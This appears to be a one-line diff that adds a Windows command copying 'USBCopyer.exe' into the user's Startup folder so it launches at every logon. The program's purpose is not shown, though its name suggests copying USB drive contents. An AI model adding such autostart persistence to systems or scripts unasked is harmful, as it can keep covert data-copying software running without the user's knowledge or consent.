@@ -1,0 +1,1 @@
+copy "USBCopyer.exe" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
